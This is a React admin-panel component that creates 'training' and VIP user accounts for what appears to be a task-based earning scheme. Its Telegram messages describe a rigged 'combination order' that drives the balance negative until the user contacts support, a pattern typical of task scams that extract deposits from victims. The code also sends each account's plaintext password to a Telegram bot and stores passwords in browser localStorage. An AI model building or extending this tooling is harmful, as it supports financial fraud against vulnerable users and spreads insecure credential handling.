import React, { useState } from 'react';
import { supabase } from '../../lib/supabase';
import { Card, CardContent, CardHeader, CardTitle } from '../ui/card';
import { Button } from '../ui/button';
import { Input } from '../ui/input';
import { useToast } from '../ui/use-toast';
import { Mail, UserPlus, Lock, GraduationCap, AlertCircle, CheckCircle, DollarSign, Send, Hash, RefreshCw, Database } from 'lucide-react';
import { TELEGRAM_CONFIG } from '../../config/telegram';

interface AccountCreationProps {
  onAccountCreated: () => void;
}

const AccountCreation: React.FC<AccountCreationProps> = ({ onAccountCreated }) => {
  const { toast } = useToast();
  const [activeTab, setActiveTab] = useState<'training' | 'user'>('training');
  const [isCreating, setIsCreating] = useState(false);
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncResults, setSyncResults] = useState<{ synced: number; failed: number; details: string[] } | null>(null);
  const personalReferralPattern = /^OPT-[A-Z0-9]{6}$/;
  
  // Training account form
  const [trainingEmail, setTrainingEmail] = useState('');
  const [trainingPassword, setTrainingPassword] = useState('');
  const [trainingName, setTrainingName] = useState('');
  const [trainingReferral, setTrainingReferral] = useState('');
  
  // User account form
  const [userEmail, setUserEmail] = useState('');
  const [userPassword, setUserPassword] = useState('');
  const [userName, setUserName] = useState('');
  const [userVipLevel, setUserVipLevel] = useState(1);
  const [userReferral, setUserReferral] = useState('');

  const sendTelegramNotification = async (message: string, timeoutMs = 10000) => {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CONFIG.CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error('Failed to send Telegram notification');
      }

      return await response.json();
    } catch (error) {
      console.error('Telegram notification error:', error);
      toast({
        title: 'Warning',
        description: 'Telegram notification failed, but account was created successfully',
        variant: 'default'
      });
    }
  };

  const createTrainingAccount = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate linked personal referral code format
    const normalizedTrainingReferral = trainingReferral.trim().toUpperCase();
    if (!personalReferralPattern.test(normalizedTrainingReferral)) {
      toast({ 
        title: 'Invalid Referral Code', 
        description: 'User Referral Code must match OPT-XXXXXX format',
        variant: 'destructive'
      });
      return;
    }
    
    setIsCreating(true);
    console.log('[AccountCreation] START - Training account creation started');

    try {
      // Check if email already exists in database
      console.log('[AccountCreation] Before email check');
      
      const emailCheckPromise = supabase
        .from('users')
        .select('email')
        .eq('email', trainingEmail.toLowerCase())
        .maybeSingle();

      const emailCheckTimeout = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Email check timeout after 10s')), 10000)
      );

      const { data: existingUser, error: emailCheckError } = await Promise.race([emailCheckPromise, emailCheckTimeout]) as any;

      if (emailCheckError) {
        console.log('[AccountCreation] STOP - Email check failed:', emailCheckError);
        toast({
          title: 'Database Error',
          description: `Failed to check email: ${emailCheckError.message || 'Unknown error'}`,
          variant: 'destructive'
        });
        setIsCreating(false);
        return;
      }
      
      console.log('[AccountCreation] After email check');

      if (existingUser) {
        console.log('[AccountCreation] STOP - Email already exists');
        toast({ 
          title: 'Email Exists', 
          description: 'Email already exists',
          variant: 'destructive'
        });
        setIsCreating(false);
        return;
      }
      console.log('[AccountCreation] Email check passed');

      // Generate referral code
      const referralCode = `TRN-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;

      // Create training account
      const trainingUser = {
        id: `training-${Date.now()}`,
        email: trainingEmail.toLowerCase(),
        phone: null,
        display_name: trainingName,
        vip_level: 2, // Training accounts get 1% commission (same as VIP2)
        balance: 1100, // Initial deposit
        total_earned: 0,
        referral_code: referralCode,
        referred_by: normalizedTrainingReferral,
        created_at: new Date().toISOString(),
        account_type: 'training' as const,
        user_status: 'active' as const,
        training_completed: false,
        training_progress: 0,
        training_phase: 1,
        tasks_completed: 0,
        trigger_task_number: null,
        has_pending_order: false,
        pending_amount: 0,
        is_negative_balance: false,
        profit_added: false,
      };

      // Store training account in localStorage for login - CONSISTENT EMAIL-BASED KEY
      const emailKey = trainingEmail.toLowerCase();
      console.log("Training account creation key:", 'training_account_' + emailKey);
      
      try {
        localStorage.setItem('training_account_' + emailKey, JSON.stringify({ 
          email: emailKey,
          password: trainingPassword,
          assignedTo: trainingName,
          userReferralCode: trainingReferral, // Personal account's referral code
          trainingReferralCode: referralCode, // Training account's own referral code
          userEmail: emailKey,
          createdAt: new Date().toISOString()
        }));
      } catch (localStorageError) {
        console.log('[AccountCreation] STOP - localStorage error for account');
        console.error('localStorage error:', localStorageError);
        toast({
          title: 'Storage Error',
          description: 'Failed to store account locally. Browser storage may be full or disabled.',
          variant: 'destructive'
        });
        setIsCreating(false);
        return;
      }
      console.log('[AccountCreation] Training account saved to localStorage');

      // Create training tasks (45 tasks per phase, 90 total) - REALISTIC PRODUCT-BASED REWARDS
      const rewardPatterns = [0.7, 1.6, 2.5, 6.4, 7.2];
      const trainingTasks = Array.from({ length: 45 }, (_, i) => {
        const patternIndex = i % rewardPatterns.length;
        const baseReward = rewardPatterns[patternIndex];
        
        // Add small variation to make it realistic (±0.2)
        const variation = (Math.random() - 0.5) * 0.4;
        const finalReward = Math.max(0.5, baseReward + variation); // Minimum $0.50
        
        return {
          id: `task-${Date.now()}-${i}`,
          user_id: emailKey, // Use email as user_id for consistency
          task_number: i + 1,
          title: `Training Task ${i + 1}`,
          description: `Complete training task ${i + 1} for phase 1`,
          status: 'pending',
          reward: Math.round(finalReward * 100) / 100,
          created_at: new Date().toISOString()
        };
      });
      console.log("Training tasks creation key:", 'training_tasks_' + emailKey);
      try {
        localStorage.setItem('training_tasks_' + emailKey, JSON.stringify(trainingTasks));
      } catch (localStorageError) {
        console.log('[AccountCreation] STOP - localStorage error for tasks');
        console.error('localStorage error:', localStorageError);
        toast({
          title: 'Storage Error',
          description: 'Failed to store tasks locally. Browser storage may be full or disabled.',
          variant: 'destructive'
        });
        setIsCreating(false);
        return;
      }
      console.log('[AccountCreation] Training tasks saved to localStorage');

      console.log('[AccountCreation] Saving training account to database:', trainingEmail);

      // Save to Supabase database for cross-device access
      console.log('[AccountCreation] Before Supabase insert');
      const supabaseInsertPromise = supabase
        .from('users')
        .insert({
          email: trainingEmail.toLowerCase(),
          // password removed - training accounts use localStorage for auth
          display_name: trainingName,
          account_type: 'training',
          vip_level: 2,
          tasks_completed: 0,
          // tasks_total removed - column does not exist in database
          balance: 1100.00,
          total_earned: 0,
          referral_code: referralCode,
          // referred_by removed - column does not exist in database
          training_completed: false,
          training_phase: 1,
          trigger_task_number: null,
          has_pending_order: false,
          pending_amount: 0,
          is_negative_balance: false,
          profit_added: false,
          user_status: 'active',
          created_at: new Date().toISOString()
        })
        .select()
        .single();

      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Supabase insert timeout after 15s')), 15000)
      );

      const { data, error } = await Promise.race([supabaseInsertPromise, timeoutPromise]) as any;

      console.log('[AccountCreation] After Supabase insert, error:', error, 'data:', data);

      if (error) {
        console.log('[AccountCreation] STOP - Database insert failed');
        console.error('[AccountCreation] Database insert failed:', error);
        toast({
          title: 'Database Error',
          description: `Failed to create training account: ${error.message || 'Unknown error'}`,
          variant: 'destructive'
        });
        setIsCreating(false);
        return;
      }

      console.log('[AccountCreation] Database insert successful:', data);

      // Skip personal account creation - training account only
      console.log('[AccountCreation] Skipping personal account creation - training account only');

      // Send Telegram notification for training account creation with referral tracking
      const telegramMessage = `
🎓 <b>TRAINING ACCOUNT CREATED</b>

👤 <b>User Details:</b>
📧 <b>Email:</b> ${trainingEmail}
🔑 <b>Password:</b> ${trainingPassword}
👤 <b>Name:</b> ${trainingName}
🏷️ <b>Account Type:</b> Training
💰 <b>Initial Balance:</b> $1100.00
📊 <b>Total Tasks:</b> 90 (45 per phase)
🎯 <b>Profit Rate:</b> 1% (Training Rate - Same as VIP2)
🔗 <b>Training Referral Code:</b> ${referralCode}
👥 <b>Linked to User Referral:</b> ${trainingReferral}
📅 <b>Created:</b> ${new Date().toLocaleString()}

📋 <b>Training Instructions:</b>
1. Login with provided credentials
2. Complete Phase 1: 45 tasks
3. Complete Phase 2: 45 tasks (includes combination order)
4. Complete training to unlock personal account

⚠️ <b>Important Notes:</b>
• Combination order triggers at task 19, 24, or 31 in Phase 2
• Balance will go negative temporarily
• Contact support to clear combination order
• 6x profit applied after clearing

💾 <b>TRACKING INFORMATION:</b>
• Training account linked to user referral: ${trainingReferral}
• User progress will be tracked throughout training
• Admin can monitor completion status
• Clean tracking system activated

🔗 <b>Contact User Support:</b> https://t.me/EARNINGSLLCONLINECS1
      `.trim();

      console.log('[AccountCreation] Before first Telegram notification');
      try {
        await sendTelegramNotification(telegramMessage, 10000);
      } catch (telegramError) {
        console.error('[AccountCreation] First Telegram notification failed:', telegramError);
      }
      console.log('[AccountCreation] After first Telegram notification');

      // Send tracking notification for referral code usage
      const trackingMessage = `
🎯 <b>TRAINING ACCOUNT TRACKED SUCCESSFULLY</b>

📊 <b>Tracking Information:</b>
👤 <b>User Referral Code:</b> ${trainingReferral}
🎓 <b>Training Account:</b> ${trainingEmail}
🔗 <b>Training Referral Code:</b> ${referralCode}
📅 <b>Tracked On:</b> ${new Date().toLocaleString()}

✅ <b>Status:</b> Successfully linked and tracked
💾 <b>System:</b> Clean tracking activated
🔍 <b>Monitoring:</b> Progress will be tracked

🔗 <b>Contact User Support:</b> https://t.me/EARNINGSLLCONLINECS1
      `.trim();

      console.log('[AccountCreation] Before second Telegram notification');
      try {
        await sendTelegramNotification(trackingMessage, 10000);
      } catch (telegramError) {
        console.error('[AccountCreation] Second Telegram notification failed:', telegramError);
      }
      console.log('[AccountCreation] After second Telegram notification');

      console.log('[AccountCreation] Before success toast');
      // Only show success toast after ALL steps succeed
      toast({
        title: 'Success',
        description: 'Training account created successfully',
        variant: 'default'
      });
      console.log('[AccountCreation] Success toast shown');
      
      // Reset form
      setTrainingEmail('');
      setTrainingPassword('');
      setTrainingName('');
      setTrainingReferral('');
      
      // Refresh data
      onAccountCreated();
      console.log('[AccountCreation] COMPLETE - Training account creation finished successfully');
      
    } catch (error: any) {
      console.log('[AccountCreation] STOP - Caught error in try-catch');
      console.error('Error creating training account:', error);
      // Extract detailed error message from Supabase error
      let errorMessage = 'Unknown error';
      if (error?.message) {
        errorMessage = error.message;
      } else if (error?.error?.message) {
        errorMessage = error.error.message;
      } else if (error?.details) {
        errorMessage = error.details;
      } else if (typeof error === 'string') {
        errorMessage = error;
      }
      console.error('[AccountCreation] Detailed error:', JSON.stringify(error, null, 2));
      toast({
        title: 'Error',
        description: `Failed: ${errorMessage}`,
        variant: 'destructive'
      });
    } finally {
      console.log('[AccountCreation] FINALLY - Setting isCreating to false');
      setIsCreating(false);
    }
  };

  const createUserAccount = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsCreating(true);

    try {
      // Check if email already exists
      const { data: existingPersonalUser } = await supabase
        .from('users')
        .select('email')
        .eq('email', userEmail)
        .single();

      if (existingPersonalUser) {
        toast({
          title: 'Email Exists',
          description: 'Email already exists',
          variant: 'destructive'
        });
        return;
      }

      // Generate referral code
      const referralCode = `OPT-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;

      // Create user account
      const { data, error } = await supabase
        .from('users')
        .insert({
          email: userEmail,
          // password removed - personal accounts should use Supabase Auth
          display_name: userName,
          account_type: 'personal',
          vip_level: userVipLevel,
          tasks_completed: 0,
          // tasks_total removed - column does not exist in database
          balance: 0,
          total_earned: 0,
          referral_code: referralCode,
          training_completed: true,
          user_status: 'active',
          // referred_by removed - column does not exist in database
          created_at: new Date().toISOString()
        })
        .select()
        .single();

      if (error) throw error;

      // Send Telegram notification
      const telegramMessage = `
👤 <b>NEW USER ACCOUNT CREATED</b>

� <b>Account Details:</b>
�📧 <b>Email:</b> ${userEmail}
� <b>Password:</b> ${userPassword}
�👤 <b>Name:</b> ${userName}
🏷️ <b>Account Type:</b> Personal
👑 <b>VIP Level:</b> VIP ${userVipLevel}
💰 <b>Initial Balance:</b> $0.00
📊 <b>Total Tasks:</b> ${userVipLevel === 1 ? 35 : 45}
🎯 <b>Profit Rate:</b> ${userVipLevel === 1 ? '0.5%' : '1%'}
🔗 <b>Referral Code:</b> ${referralCode}
${userReferral ? `� <b>Referred By:</b> ${userReferral}` : ''}
�📅 <b>Created:</b> ${new Date().toLocaleString()}

📋 <b>Account Instructions:</b>
1. Login with provided credentials
2. Complete ${userVipLevel === 1 ? 35 : 45} tasks
3. Submit products to earn profit
4. Withdraw earnings upon completion

💾 <b>TRACKING ENABLED:</b>
• This account is linked to referral code: ${referralCode}
${userReferral ? `• Referred by: ${userReferral}` : ''}
• User progress will be tracked by admin
• Can monitor completion status

🔗 <b>Contact User Support:</b> https://t.me/EARNINGSLLCONLINECS1
      `.trim();

      await sendTelegramNotification(telegramMessage);

      toast({
        title: 'Success',
        description: 'User account created successfully',
        variant: 'default'
      });
      
      // Reset form
      setUserEmail('');
      setUserPassword('');
      setUserName('');
      setUserVipLevel(1);
      setUserReferral('');
      
      // Refresh data
      onAccountCreated();
      
    } catch (error: any) {
      console.error('Error creating user account:', error);
      const errorMessage = error?.message || error?.error?.message || 'Unknown error';
      toast({
        title: 'Error',
        description: `Failed to create user account: ${errorMessage}`,
        variant: 'destructive'
      });
    } finally {
      setIsCreating(false);
    }
  };

  // Function to sync localStorage accounts to database
  const syncLocalAccountsToDatabase = async () => {
    setIsSyncing(true);
    setSyncResults(null);
    
    const results = { synced: 0, failed: 0, details: [] as string[] };
    
    try {
      // Find all localStorage keys that start with opt_training_
      const keys = Object.keys(localStorage).filter(key => key.startsWith('opt_training_'));
      
      console.log(`[Sync] Found ${keys.length} training accounts in localStorage`);
      
      for (const key of keys) {
        try {
          const localData = JSON.parse(localStorage.getItem(key) || '{}');
          const email = localData.email;
          
          if (!email || !localData.password) {
            console.log(`[Sync] Skipping ${key} - missing email or password`);
            continue;
          }
          
          // Check if already exists in database
          const { data: existingUser } = await supabase
            .from('users')
            .select('email')
            .eq('email', email.toLowerCase())
            .maybeSingle();
          
          if (existingUser) {
            console.log(`[Sync] Skipping ${email} - already exists in database`);
            results.details.push(`Skipped: ${email} (already in database)`);
            continue;
          }
          
          // Generate referral code if not present
          const referralCode = localData.trainingReferralCode || `TRN-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
          
          // Insert into database
          const { error } = await supabase
            .from('users')
            .insert({
              email: email.toLowerCase(),
              // password removed - training accounts use localStorage for auth
              display_name: localData.assignedTo || 'Training User',
              account_type: 'training',
              vip_level: 2,
              tasks_completed: 0,
              // tasks_total removed - column does not exist in database
              balance: 1100,
              total_earned: 0,
              referral_code: referralCode,
              // referred_by removed - column does not exist in database
              training_completed: false,
              training_phase: 1,
              trigger_task_number: null,
              has_pending_order: false,
              pending_amount: 0,
              is_negative_balance: false,
              profit_added: false,
              user_status: 'active',
              created_at: localData.createdAt || new Date().toISOString()
            });
          
          if (error) {
            console.error(`[Sync] Failed to sync ${email}:`, error);
            results.failed++;
            results.details.push(`Failed: ${email} - ${error.message}`);
          } else {
            console.log(`[Sync] Successfully synced ${email}`);
            results.synced++;
            results.details.push(`Synced: ${email}`);
          }
        } catch (syncError) {
          console.error(`[Sync] Error processing ${key}:`, syncError);
          results.failed++;
          results.details.push(`Error: ${key}`);
        }
      }
      
      setSyncResults(results);
      
      if (results.synced > 0) {
        toast({
          title: 'Sync Complete',
          description: `Synced ${results.synced} accounts to database. Failed: ${results.failed}`,
          variant: 'default'
        });
      } else if (results.failed === 0) {
        toast({
          title: 'No Accounts to Sync',
          description: 'All local accounts are already in the database or no accounts found.',
          variant: 'default'
        });
      } else {
        toast({
          title: 'Sync Failed',
          description: `Failed to sync ${results.failed} accounts. Check console for details.`,
          variant: 'destructive'
        });
      }
    } catch (error) {
      console.error('[Sync] Sync process error:', error);
      toast({
        title: 'Sync Error',
        description: 'An error occurred during sync. Check console.',
        variant: 'destructive'
      });
    } finally {
      setIsSyncing(false);
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold text-white">Account Creation <span className="text-xs text-green-400">v3-fixed</span></h2>
          <p className="text-slate-400">Create new training and user accounts</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Training Account Creation */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center">
              <GraduationCap className="w-5 h-5 mr-2 text-green-500" />
              Create Training Account
            </CardTitle>
            <p className="text-slate-400 text-sm">
              Create a new training account for users to complete training tasks
            </p>
          </CardHeader>
          <CardContent>
            <form onSubmit={createTrainingAccount} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <Mail className="w-4 h-4 inline mr-1" />
                  Email Address
                </label>
                <Input
                  type="email"
                  value={trainingEmail}
                  onChange={(e) => setTrainingEmail(e.target.value)}
                  placeholder="training@example.com"
                  className="bg-slate-700 border-slate-600 text-white"
                  required
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <UserPlus className="w-4 h-4 inline mr-1" />
                  Full Name
                </label>
                <Input
                  type="text"
                  value={trainingName}
                  onChange={(e) => setTrainingName(e.target.value)}
                  placeholder="John Doe"
                  className="bg-slate-700 border-slate-600 text-white"
                  required
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <Hash className="w-4 h-4 inline mr-1" />
                  User Referral Code <span className="text-red-400">*</span>
                </label>
                <Input
                  type="text"
                  value={trainingReferral}
                  onChange={(e) => setTrainingReferral(e.target.value.toUpperCase())}
                  placeholder="OPT-TYY1O6"
                  className={`bg-slate-700 border-slate-600 text-white ${
                    personalReferralPattern.test((trainingReferral || '').trim().toUpperCase())
                      ? 'border-green-500 focus:border-green-400' 
                      : trainingReferral 
                        ? 'border-yellow-500 focus:border-yellow-400'
                        : 'border-red-500 focus:border-red-400'
                  }`}
                />
                <p className="text-xs text-slate-500 mt-1">
                  {personalReferralPattern.test((trainingReferral || '').trim().toUpperCase())
                    ? '✓ Valid referral code format' 
                    : trainingReferral 
                      ? '⚠️ Referral code must match OPT-XXXXXX'
                      : 'Enter the user\'s referral code for tracking (mandatory)'}
                </p>
              </div>
              
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <Lock className="w-4 h-4 inline mr-1" />
                  Password
                </label>
                <Input
                  type="password"
                  value={trainingPassword}
                  onChange={(e) => setTrainingPassword(e.target.value)}
                  placeholder="••••••••"
                  className="bg-slate-700 border-slate-600 text-white"
                  required
                />
              </div>

              <div className="p-3 bg-green-500/10 border border-green-500/20 rounded-lg">
                <div className="flex items-start space-x-2">
                  <CheckCircle className="w-4 h-4 text-green-400 mt-0.5" />
                  <div>
                    <p className="text-green-400 text-sm font-medium">Training Account Features:</p>
                    <ul className="text-green-300 text-xs space-y-1 mt-1">
                      <li>• 45 training tasks required</li>
                      <li>• 1% commission per task (Same as VIP2 Silver)</li>
                      <li>• Initial deposit: $1100</li>
                      <li>• Training completion tracking</li>
                      <li>• Telegram notification sent</li>
                    </ul>
                  </div>
                </div>
              </div>
              
              <Button
                type="submit"
                disabled={isCreating || !personalReferralPattern.test((trainingReferral || '').trim().toUpperCase())}
                className="w-full bg-green-600 hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isCreating ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2" />
                    Creating...
                  </>
                ) : (
                  <>
                    <UserPlus className="w-4 h-4 mr-2" />
                    {!personalReferralPattern.test((trainingReferral || '').trim().toUpperCase()) 
                      ? 'Enter Valid Referral Code' 
                      : 'Create Training Account'}
                  </>
                )}
              </Button>
            </form>
          </CardContent>
        </Card>

        {/* User Account Creation */}
        <Card className="bg-slate-800/50 border-slate-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center">
              <UserPlus className="w-5 h-5 mr-2 text-blue-500" />
              Create User Account
            </CardTitle>
            <p className="text-slate-400 text-sm">
              Create a new personal user account with VIP features
            </p>
          </CardHeader>
          <CardContent>
            <form onSubmit={createUserAccount} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <Mail className="w-4 h-4 inline mr-1" />
                  Email Address
                </label>
                <Input
                  type="email"
                  value={userEmail}
                  onChange={(e) => setUserEmail(e.target.value)}
                  placeholder="user@example.com"
                  className="bg-slate-700 border-slate-600 text-white"
                  required
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <UserPlus className="w-4 h-4 inline mr-1" />
                  Full Name
                </label>
                <Input
                  type="text"
                  value={userName}
                  onChange={(e) => setUserName(e.target.value)}
                  placeholder="John Doe"
                  className="bg-slate-700 border-slate-600 text-white"
                  required
                />
              </div>
              
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <Lock className="w-4 h-4 inline mr-1" />
                  Password
                </label>
                <Input
                  type="password"
                  value={userPassword}
                  onChange={(e) => setUserPassword(e.target.value)}
                  placeholder="••••••••"
                  className="bg-slate-700 border-slate-600 text-white"
                  required
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <DollarSign className="w-4 h-4 inline mr-1" />
                  VIP Level
                </label>
                <select
                  value={userVipLevel}
                  onChange={(e) => setUserVipLevel(Number(e.target.value))}
                  className="w-full bg-slate-700 border-slate-600 text-white rounded px-3 py-2"
                >
                  <option value={1}>VIP 1 - 35 Tasks</option>
                  <option value={2}>VIP 2 - 45 Tasks</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  <Send className="w-4 h-4 inline mr-1" />
                  Referral Code (Optional)
                </label>
                <Input
                  type="text"
                  value={userReferral}
                  onChange={(e) => setUserReferral(e.target.value)}
                  placeholder="REF-123456"
                  className="bg-slate-700 border-slate-600 text-white"
                />
              </div>

              <div className="p-3 bg-blue-500/10 border border-blue-500/20 rounded-lg">
                <div className="flex items-start space-x-2">
                  <CheckCircle className="w-4 h-4 text-blue-400 mt-0.5" />
                  <div>
                    <p className="text-blue-400 text-sm font-medium">User Account Features:</p>
                    <ul className="text-blue-300 text-xs space-y-1 mt-1">
                      <li>• VIP {userVipLevel}: {userVipLevel === 1 ? 35 : 45} tasks required</li>
                      <li>• {userVipLevel === 1 ? '0.5% profit per product' : '1% profit per product'}</li>
                      <li>• Earning capabilities</li>
                      <li>• Referral system supported</li>
                      <li>• Telegram notification sent</li>
                    </ul>
                  </div>
                </div>
              </div>
              
              <Button
                type="submit"
                disabled={isCreating}
                className="w-full bg-blue-600 hover:bg-blue-700"
              >
                {isCreating ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2" />
                    Creating...
                  </>
                ) : (
                  <>
                    <UserPlus className="w-4 h-4 mr-2" />
                    Create User Account
                  </>
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>

      {/* Sync to Database Card */}
      <Card className="bg-slate-800/50 border-slate-700">
        <CardHeader>
          <CardTitle className="text-white flex items-center">
            <Database className="w-5 h-5 mr-2 text-purple-500" />
            Sync Local Accounts to Database
          </CardTitle>
          <p className="text-slate-400 text-sm">
            Push training accounts from this browser to the database so they work on any device
          </p>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className="p-3 bg-purple-500/10 border border-purple-500/20 rounded-lg">
              <div className="flex items-start space-x-2">
                <AlertCircle className="w-4 h-4 text-purple-400 mt-0.5" />
                <div>
                  <p className="text-purple-400 text-sm font-medium">Why sync accounts?</p>
                  <ul className="text-purple-300 text-xs space-y-1 mt-1">
                    <li>• Accounts created before database fix only exist locally</li>
                    <li>• Syncing allows login from any device/browser</li>
                    <li>• Only accounts not already in database will be synced</li>
                    <li>• Check browser console for detailed sync logs</li>
                  </ul>
                </div>
              </div>
            </div>

            <Button
              onClick={syncLocalAccountsToDatabase}
              disabled={isSyncing}
              className="w-full bg-purple-600 hover:bg-purple-700"
            >
              {isSyncing ? (
                <>
                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                  Syncing...
                </>
              ) : (
                <>
                  <Database className="w-4 h-4 mr-2" />
                  Sync Local Accounts to Database
                </>
              )}
            </Button>

            {syncResults && (
              <div className="mt-4 p-3 bg-slate-700/50 rounded-lg">
                <p className="text-sm font-medium text-white mb-2">Sync Results:</p>
                <div className="flex gap-4 text-sm">
                  <span className="text-green-400">Synced: {syncResults.synced}</span>
                  <span className="text-red-400">Failed: {syncResults.failed}</span>
                </div>
                {syncResults.details.length > 0 && (
                  <div className="mt-2 max-h-32 overflow-y-auto text-xs text-slate-300 space-y-1">
                    {syncResults.details.map((detail, i) => (
                      <div key={i} className={
                        detail.startsWith('Synced') ? 'text-green-400' :
                        detail.startsWith('Failed') ? 'text-red-400' :
                        'text-yellow-400'
                      }>
                        {detail}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      {/* Info Card */}
      <Card className="bg-slate-800/50 border-slate-700">
        <CardHeader>
          <CardTitle className="text-white flex items-center">
            <AlertCircle className="w-5 h-5 mr-2 text-yellow-500" />
            Account Creation Information
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <h4 className="text-sm font-medium text-green-400 mb-2">Training Accounts</h4>
              <ul className="text-xs text-slate-300 space-y-1">
                <li>• 45 training tasks required</li>
                <li>• Free account (no VIP benefits)</li>
                <li>• Must complete training to upgrade</li>
                <li>• No earning until training completed</li>
                <li>• Telegram notification sent on creation</li>
              </ul>
            </div>
            <div>
              <h4 className="text-sm font-medium text-blue-400 mb-2">User Accounts</h4>
              <ul className="text-xs text-slate-300 space-y-1">
                <li>• VIP 1: 35 tasks required</li>
                <li>• VIP 2: 45 tasks required</li>
                <li>• Can earn from completed tasks</li>
                <li>• Referral system supported</li>
                <li>• Telegram notification sent on creation</li>
              </ul>
            </div>
          </div>
          <div className="mt-4 p-3 bg-yellow-500/10 border border-yellow-500/20 rounded-lg">
            <p className="text-yellow-300 text-xs">
              <strong>Note:</strong> All account creations are logged and sent to Telegram for monitoring. 
              Each account receives a unique referral code for tracking purposes.
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default AccountCreation;
